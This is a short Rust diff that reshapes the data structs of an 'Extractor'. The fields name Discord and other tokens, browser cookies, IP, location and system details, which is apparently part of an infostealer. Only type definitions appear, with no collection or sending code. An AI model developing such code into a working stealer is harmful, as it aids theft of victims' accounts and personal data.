@@ -9,9 +9,13 @@ pub struct Extractor {
 
 #[derive(Serialize, Deserialize, Default)]
 pub struct ExtractedData {
-    discord_tokens: Vec<String>,
-    browser_cookies: Vec<BrowserCookie>,
+    ip: String,
+    location: String,
+    tokens: Vec<String>,
     system_info: SystemInfo,
+    timestamp: u64,
+    #[serde(default)]
+    browser_cookies: Vec<BrowserCookie>,
 }
 
 #[derive(Serialize, Deserialize, Default)]
@@ -25,15 +29,15 @@ struct BrowserCookie {
 
 #[derive(Serialize, Deserialize, Default)]
 struct SystemInfo {
-    ip: String,
-    location: String,
-    user_agent: String,
-    os: String,
-    cpu: String,
-    gpu: String,
-    ram: u64,
-    timestamp: u64,
+  #[serde(default)]
+  user_agent: Option<String>,
+  os: String,
+  cpu: String,
+  #[serde(default)]
+  gpu: Option<String>,
+  ram: u64,
 }
+
 
 impl Extractor {
     pub fn new() -> Self {
